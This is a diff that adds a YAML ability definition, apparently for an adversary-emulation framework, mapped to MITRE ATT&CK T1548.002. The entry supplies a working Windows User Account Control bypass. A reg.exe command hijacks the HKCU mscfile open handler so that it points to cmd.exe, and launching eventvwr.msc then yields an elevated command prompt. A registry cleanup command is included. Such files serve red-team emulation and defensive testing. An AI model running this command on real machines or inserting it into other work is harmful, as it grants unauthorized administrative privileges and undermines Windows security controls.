@@ -1,0 +1,18 @@
+---
+- id: 8ad2169ec4d0df6df900f8f8959ad761
+  name: Bypass UAC using Event Viewer (cmd)
+  description: "Bypasses User Account Control using Event Viewer and a relevant Windows\
+    \ Registry modification. More information here - https://enigma0x3.net/2016/08/15/fileless-uac-bypass-using-eventvwr-exe-and-registry-hijacking/\n\
+    Upon execution command prompt should be launched with administrative privileges.\
+    \ \n"
+  tactic: privilege-escalation
+  technique:
+    attack_id: T1548.002
+    name: 'Abuse Elevation Control Mechanism: Bypass User Account Control'
+  platforms:
+    windows:
+      cmd:
+        command: reg.exe add hkcu\software\classes\mscfile\shell\open\command /ve
+          /d "C:\Windows\System32\cmd.exe" /f && cmd.exe /c eventvwr.msc
+        payloads: []
+        cleanup: reg.exe delete hkcu\software\classes\mscfile /f >nul 2>&1
